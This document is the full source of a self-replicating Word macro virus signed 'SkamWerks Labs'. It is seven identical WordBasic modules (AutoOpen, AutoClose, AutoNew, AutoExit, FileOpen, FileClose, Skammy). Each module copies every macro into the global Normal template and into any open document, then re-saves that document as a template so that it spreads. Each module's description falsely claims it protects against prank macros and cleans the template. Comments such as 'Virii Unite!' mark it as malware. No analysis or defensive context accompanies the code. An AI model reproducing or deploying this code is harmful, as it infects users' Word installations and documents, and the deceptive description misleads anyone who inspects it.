   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "Skammy"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Skammy.MAIN"
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:AutoClose"
        WordBasic.MacroCopy MacName$, "Global:AutoNew"
        WordBasic.MacroCopy MacName$, "Global:AutoExit"
        WordBasic.MacroCopy MacName$, "Global:FileOpen"
        WordBasic.MacroCopy MacName$, "Global:FileClose"
        WordBasic.MacroCopy MacName$, "Global:Skammy"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoCloseHandler
       MacName$ = FName$ + ":AutoClose"
        WordBasic.MacroCopy "Global:AutoClose", MacName$
   AutoCloseHandler:

   On Error GoTo -1: On Error GoTo AutoNewHandler
        MacName$ = FName$ + ":AutoNew"
         WordBasic.MacroCopy "Global:AutoNew", MacName$
   AutoNewHandler:

   On Error GoTo -1: On Error GoTo AutoExitHandler
        MacName$ = FName$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", MacName$
   AutoExitHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
        MacName$ = FName$ + ":FileOpen"
        WordBasic.MacroCopy "Global:FileOpen", MacName$
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo FileCloseHandler
        MacName$ = FName$ + ":FileClose"
        WordBasic.MacroCopy "Global:FileClose", MacName$
   FileCloseHandler:

   On Error GoTo -1: On Error GoTo OtherNameHandler
        MacName$ = FName$ + ":Skammy"
        WordBasic.MacroCopy "Global:Skammy", MacName$
   OtherNameHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub
